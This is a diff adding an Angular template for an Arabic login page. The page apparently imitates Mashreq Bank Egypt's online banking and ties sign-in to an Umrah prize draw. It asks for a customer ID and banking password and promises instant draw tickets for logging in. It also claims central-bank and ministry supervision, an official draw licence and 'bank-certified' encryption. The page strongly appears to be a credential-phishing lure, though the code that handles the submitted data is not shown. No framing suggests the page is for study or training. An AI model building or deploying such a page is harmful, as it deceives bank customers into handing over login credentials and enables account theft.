@@ -1,0 +1,318 @@
+<section class="lhero">
+  <!-- Ambient Background -->
+  <div class="lhero__bg" aria-hidden="true">
+    <div class="lhero__blob lhero__blob--1"></div>
+    <div class="lhero__blob lhero__blob--2"></div>
+    <svg class="lhero__grid-svg" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <pattern id="arabesque-grid" width="48" height="48" patternUnits="userSpaceOnUse">
+          <path d="M24 0L48 24L24 48L0 24Z" stroke-width="0.75"/>
+          <circle cx="24" cy="24" r="8" stroke-width="0.5"/>
+          <path d="M0 0L48 48M48 0L0 48" stroke-dasharray="2 4" stroke-width="0.3"/>
+        </pattern>
+      </defs>
+      <rect width="100%" height="100%" fill="url(#arabesque-grid)"/>
+    </svg>
+  </div>
+
+  <div class="lhero__inner">
+    <!-- Top Meta Bar -->
+    <div class="lhero__meta-bar">
+      <div class="lhero__meta-left">
+        <span class="lhero__campaign-pill">
+          <span class="material-symbols-outlined lhero__pill-icon" style="font-variation-settings: 'FILL' 1;">stars</span>
+          حملة المشرق الكبرى لموسم العمرة 2025
+        </span>
+        <span class="lhero__countdown-pill">
+          <span class="lhero__pulse-dot"></span>
+          السحب القادم: بعد 14 يوماً
+        </span>
+      </div>
+      <div class="lhero__meta-right">
+        <span class="material-symbols-outlined lhero__verified-icon">verified</span>
+        <span class="lhero__meta-text">بوابة الدخول المشفرة والمصدقة بنكياً</span>
+      </div>
+    </div>
+
+    <!-- Main 2-Column Grid -->
+    <div class="lhero__grid">
+
+      <!-- ── Left Column: Login Form ── -->
+      <div class="lhero__form-col">
+        <!-- Color Accent Bar -->
+        <div class="lhero__accent-bar"></div>
+
+        <!-- Form Header -->
+        <div class="lhero__form-header">
+          <div class="lhero__form-header-text">
+            <span class="lhero__form-eyebrow text-label-sm">الخدمات المصرفية الآمنة</span>
+            <h1 class="lhero__form-title text-headline-md">تسجيل الدخول إلى المشرق أونلاين</h1>
+            <p class="lhero__form-sub text-body-md">أدخل بياناتك المصرفية للمتابعة إلى لوحة تحكم السحب ومحفظتك البنكية بأمان</p>
+          </div>
+          <div class="lhero__form-shield">
+            <span class="material-symbols-outlined lhero__shield-icon">shield_lock</span>
+          </div>
+        </div>
+
+        <!-- Bonus Banner -->
+        <div class="lhero__bonus-banner">
+          <div class="lhero__bonus-icon-wrap">
+            <span class="material-symbols-outlined lhero__bonus-icon">card_giftcard</span>
+          </div>
+          <div class="lhero__bonus-text">
+            <p class="lhero__bonus-title text-title-md">تأكيد تلقائي لفرص السحب</p>
+            <p class="lhero__bonus-body text-body-sm">
+              عند دخولك الناجح، ستضاف
+              <strong class="lhero__bonus-highlight">+5 تذاكر فورية</strong>
+              إلى رصيدك المؤهل لرحلة العمرة لشخصين.
+            </p>
+          </div>
+        </div>
+
+        <!-- Form -->
+        <form class="lhero__form" (ngSubmit)="onSubmit()" #loginForm="ngForm">
+          <!-- Username Field -->
+          <div class="lhero__field">
+            <div class="lhero__field-top-row">
+              <label class="lhero__label text-label-lg" for="usernameInput">
+                اسم المستخدم أو رقم الحساب التعريفي (Customer ID)
+              </label>
+              <a href="#" class="lhero__forgot-link text-label-sm">نسيت اسم المستخدم؟</a>
+            </div>
+            <div class="lhero__input-wrap">
+              <span class="material-symbols-outlined lhero__input-icon">person</span>
+              <input
+                id="usernameInput"
+                type="text"
+                class="lhero__input"
+                placeholder="مثال: EG9023418 أو اسم المستخدم المعتمد"
+                required
+                [ngModel]="form().username"
+                (ngModelChange)="updateField('username', $event)"
+                name="username"
+              />
+            </div>
+            <div class="lhero__field-footer-row">
+              <label class="lhero__remember-label">
+                <input
+                  type="checkbox"
+                  class="lhero__remember-check"
+                  [checked]="form().rememberUsername"
+                  (change)="updateField('rememberUsername', !form().rememberUsername)"
+                />
+                <span class="text-label-sm lhero__remember-text">حفظ اسم المستخدم على هذا المتصفح الموثوق</span>
+              </label>
+              <span class="lhero__encrypted-badge text-label-sm">
+                <span class="material-symbols-outlined lhero__encrypted-icon">lock</span>
+                مشفر محلياً
+              </span>
+            </div>
+          </div>
+
+          <!-- Password Field -->
+          <div class="lhero__field">
+            <div class="lhero__field-top-row">
+              <label class="lhero__label text-label-lg" for="passwordInput">كلمة المرور البنكية (Password)</label>
+              <a href="#" class="lhero__forgot-link text-label-sm">هل نسيت كلمة المرور؟</a>
+            </div>
+            <div class="lhero__input-wrap">
+              <span class="material-symbols-outlined lhero__input-icon">password</span>
+              <input
+                id="passwordInput"
+                [type]="showPass() ? 'text' : 'password'"
+                class="lhero__input lhero__input--with-action"
+                placeholder="••••••••••••"
+                required
+                [ngModel]="form().password"
+                (ngModelChange)="updateField('password', $event)"
+                name="password"
+              />
+              <button
+                type="button"
+                class="lhero__toggle-pass"
+                (click)="togglePassword()"
+                [attr.aria-label]="showPass() ? 'إخفاء كلمة المرور' : 'إظهار كلمة المرور'"
+              >
+                <span class="material-symbols-outlined">{{ showPass() ? 'visibility_off' : 'visibility' }}</span>
+              </button>
+            </div>
+            <div class="lhero__pass-footer-row">
+              <button type="button" class="lhero__keypad-toggle text-label-sm" (click)="toggleKeypad()">
+                <span class="material-symbols-outlined lhero__keypad-icon">keyboard</span>
+                <span>استخدام لوحة المفاتيح الافتراضية الآمنة (Anti-Keylogger)</span>
+              </button>
+              <div class="lhero__security-image-badge text-label-sm">
+                <span class="material-symbols-outlined lhero__camera-icon">photo_camera_front</span>
+                <span>صورة الأمان الخاصة بك مفعلة</span>
+              </div>
+            </div>
+
+            <!-- Virtual Keypad -->
+            @if (showKeypad()) {
+              <div class="lhero__keypad">
+                <div class="lhero__keypad-header">
+                  <span class="lhero__keypad-title text-label-sm">لوحة المفاتيح الآمنة ضد التجسس البرمجي</span>
+                  <button type="button" class="lhero__keypad-close" (click)="toggleKeypad()">إغلاق ✕</button>
+                </div>
+                <div class="lhero__keypad-grid">
+                  @for (digit of keypadDigits(); track digit) {
+                    <button
+                      type="button"
+                      class="lhero__keypad-btn text-body-sm"
+                      (click)="appendKeypadChar(digit)"
+                    >{{ digit }}</button>
+                  }
+                </div>
+              </div>
+            }
+          </div>
+
+          <!-- Submit Actions -->
+          <div class="lhero__actions">
+            <button
+              type="submit"
+              class="lhero__submit-btn text-label-lg"
+              [disabled]="isLoading()"
+            >
+              @if (isLoading()) {
+                <span class="material-symbols-outlined lhero__spinner">progress_activity</span>
+                <span>جارٍ التحقق والدخول الآمن...</span>
+              } @else {
+                <span class="material-symbols-outlined">login</span>
+                <span>تسجيل الدخول والمتابعة لسحب العمرة</span>
+              }
+            </button>
+
+            <div class="lhero__divider">
+              <div class="lhero__divider-line"></div>
+              <span class="lhero__divider-text text-label-sm">أو بطرق الدخول السريعة</span>
+              <div class="lhero__divider-line"></div>
+            </div>
+
+            <div class="lhero__alt-btns">
+              <button type="button" class="lhero__alt-btn text-label-md">
+                <span class="material-symbols-outlined lhero__alt-icon lhero__alt-icon--primary">smartphone</span>
+                <span>رمز الأمان السريع (OTP)</span>
+              </button>
+              <button type="button" class="lhero__alt-btn text-label-md">
+                <span class="material-symbols-outlined lhero__alt-icon lhero__alt-icon--tertiary">fingerprint</span>
+                <span>تطبيق المشرق نيو (NEO)</span>
+              </button>
+            </div>
+          </div>
+        </form>
+
+        <!-- Footer: New Client + Security badges -->
+        <div class="lhero__form-footer">
+          <div class="lhero__new-client-bar">
+            <div class="lhero__new-client-left">
+              <span class="material-symbols-outlined lhero__new-client-icon">person_add</span>
+              <span class="text-body-sm">عميل جديد لدى بنك المشرق مصر؟</span>
+            </div>
+            <a href="#" class="lhero__new-client-link text-label-lg">
+              <span>افتح حسابك وسجّل أونلاين خلال دقيقة</span>
+              <span class="material-symbols-outlined lhero__link-arrow">arrow_back</span>
+            </a>
+          </div>
+          <div class="lhero__security-tags">
+            <span class="lhero__security-tag">
+              <span class="material-symbols-outlined lhero__sec-icon lhero__sec-icon--tertiary">lock</span>
+              تشفير بنكي عالي المستوى SSL 256-Bit
+            </span>
+            <span class="lhero__security-tag">
+              <span class="material-symbols-outlined lhero__sec-icon lhero__sec-icon--primary">security</span>
+              حماية متوافقة مع تعليمات البنك المركزي المصري
+            </span>
+            <span class="lhero__security-tag">
+              <span class="material-symbols-outlined lhero__sec-icon lhero__sec-icon--secondary">verified_user</span>
+              ضمان مكافحة الاحتيال المصرفي
+            </span>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── Right Column: Campaign Visual ── -->
+      <div class="lhero__visual-col">
+        <div class="lhero__visual-card">
+          <!-- Background Image -->
+          <div
+            class="lhero__visual-bg"
+            role="img"
+            aria-label="الكعبة المشرفة عند الغروب"
+            style="background-image: url('https://lh3.googleusercontent.com/aida-public/AB6AXuC3HLkTyjnEyvHMme0Pk2ITY5zs5Bt-xFmnB4VdBqINP_Lb_aiI-k2G6e2EihNb3CYNEPH-cYSh6PGVvLfM-o184yT_7WNNlLLMTCE86zLaUSZyd4yggdPwrc19epWOypFKfWDDCtzIFzLlaLuExfFAlaPnRHLj3xMGX0C025LtiYo53Sg-9IFo4fN1Gz1AxW1NX1x8rCxVxhGd4jdkawnrw07v1Celk6EjnptxgHqWwruEdM3wToOq7g')"
+          ></div>
+          <div class="lhero__visual-overlay"></div>
+
+          <!-- Visual Content -->
+          <div class="lhero__visual-content">
+            <!-- Top Badges -->
+            <div class="lhero__visual-top">
+              <span class="lhero__vip-badge text-label-md">
+                <span class="material-symbols-outlined lhero__vip-icon" style="font-variation-settings: 'FILL' 1;">workspace_premium</span>
+                50 باقة عمرة فاخرة شاملة بالكامل
+              </span>
+              <span class="lhero__stage-badge text-label-sm">مرحلة التسجيل والتأهيل</span>
+            </div>
+
+            <!-- Campaign Info -->
+            <div class="lhero__visual-info">
+              <span class="lhero__visual-eyebrow text-label-md">رحلة إيمانية لا تُنسى في ضيافة الرحمن</span>
+              <h2 class="lhero__visual-title text-headline-md">
+                سجّل دخولك وفعّل تأهيلك المباشر في السحب الأكبر لعام 2025
+              </h2>
+              <p class="lhero__visual-body text-body-md">
+                اربط حسابك المصرفي الآن، واستفد من جميع المعاملات البنكية اليومية، المشتريات بالبطاقات، وشراء الشهادات لزيادة فرص فوزك برحلة عمرة VIP شاملة الطيران والإقامة المطلة على الحرم.
+              </p>
+            </div>
+
+            <!-- Benefit Cards -->
+            <div class="lhero__benefits">
+              <div class="lhero__benefit-card">
+                <div class="lhero__benefit-badge">+5</div>
+                <div>
+                  <h3 class="lhero__benefit-title text-title-md">فرص إضافية فورية بمجرد الدخول</h3>
+                  <p class="lhero__benefit-body text-body-sm">تسجيل دخولك عبر منصة المشرق أونلاين يمنحك 5 تذاكر سحب مؤكدة دون أي شروط مسبقة.</p>
+                </div>
+              </div>
+              <div class="lhero__benefit-card">
+                <div class="lhero__benefit-icon-wrap lhero__benefit-icon-wrap--tertiary">
+                  <span class="material-symbols-outlined lhero__benefit-icon">hotel</span>
+                </div>
+                <div>
+                  <h3 class="lhero__benefit-title text-title-md">إقامة 5 نجوم فاخرة مطلة على الكعبة</h3>
+                  <p class="lhero__benefit-body text-body-sm">تشمل تذاكر طيران مباشرة من القاهرة/الإسكندرية وتنقلات VIP خاصة وبرنامج إرشاد متكامل.</p>
+                </div>
+              </div>
+              <div class="lhero__benefit-card">
+                <div class="lhero__benefit-icon-wrap lhero__benefit-icon-wrap--surface">
+                  <span class="material-symbols-outlined lhero__benefit-icon">insights</span>
+                </div>
+                <div>
+                  <h3 class="lhero__benefit-title text-title-md">عداد تفاعلي مباشر لفرصك</h3>
+                  <p class="lhero__benefit-body text-body-sm">متابعة دقيقة في لوحة حسابك لتذاكر السحب المكتسبة مع كل عملية دفع فواتير أو تحويل.</p>
+                </div>
+              </div>
+            </div>
+
+            <!-- Flight Footer -->
+            <div class="lhero__flight-footer">
+              <div class="lhero__flight-left">
+                <div class="lhero__flight-icon-wrap">
+                  <span class="material-symbols-outlined lhero__flight-icon">flight_takeoff</span>
+                </div>
+                <div>
+                  <p class="lhero__flight-label text-label-sm">الموعد المستهدف للرحلات</p>
+                  <p class="lhero__flight-date text-title-md">شعبان ورمضان 1446 هـ</p>
+                </div>
+              </div>
+              <div class="lhero__flight-right">
+                <span class="lhero__flight-authority text-label-sm">بإشراف وزارة التضامن والبنك المركزي</span>
+                <p class="lhero__flight-license text-label-md">ترخيص سحب رسمي رقم 104 لسنة 2025</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
